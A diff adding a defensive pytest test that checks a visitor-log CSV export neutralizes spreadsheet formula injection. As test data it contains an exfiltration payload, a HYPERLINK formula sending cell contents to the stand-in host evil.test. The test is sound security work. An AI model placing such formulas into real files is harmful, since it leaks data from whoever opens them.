@@ -1518,3 +1518,32 @@ def test_manual_entry_scoped_to_callers_active_company(client: TestClient, db_se
     list_b = client.get("/api/v1/visitor-logs/", headers=_headers_for(admin_b))
     assert list_b.status_code == status.HTTP_200_OK, list_b.text
     assert new_id not in {r["id"] for r in list_b.json()["items"]}
+
+
+# --- 7e. Spreadsheet formula injection in the CSV export --------------------
+
+
+def test_export_csv_neutralizes_formula_injection_in_visitor_text(client: TestClient, db_session: Session):
+    """A visitor name typed at the lobby tablet must not become a live formula in
+    the exported CSV (CWE-1236). Excel evaluates a cell starting with '=' on open,
+    so the export prefixes it with a single quote; the reparsed cell still carries
+    the original text, and ordinary names are untouched."""
+    import csv as _csv
+    import io as _io
+
+    admin = _make_user(db_session, company_id=COMPANY_A, role=UserRole.ADMIN)
+    payload = '=HYPERLINK("http://evil.test/?d="&A1,"CLICK")'
+    _make_visitor(db_session, company_id=COMPANY_A, visitor_name=payload, visitor_company="@SUM(1+1)")
+    _make_visitor(db_session, company_id=COMPANY_A, visitor_name="Ordinary Visitor")
+
+    resp = client.get("/api/v1/visitor-logs/export.csv", headers=_headers_for(admin))
+    assert resp.status_code == status.HTTP_200_OK, resp.text
+
+    rows = list(_csv.DictReader(_io.StringIO(resp.text)))
+    names = {r["visitor_name"] for r in rows}
+    assert "'" + payload in names, "the formula payload must be neutralized with a leading quote"
+    assert payload not in names, "an un-prefixed formula cell must never be emitted"
+    assert "Ordinary Visitor" in names, "ordinary text must pass through unchanged"
+
+    injected = next(r for r in rows if r["visitor_name"] == "'" + payload)
+    assert injected["visitor_company"] == "'@SUM(1+1)"
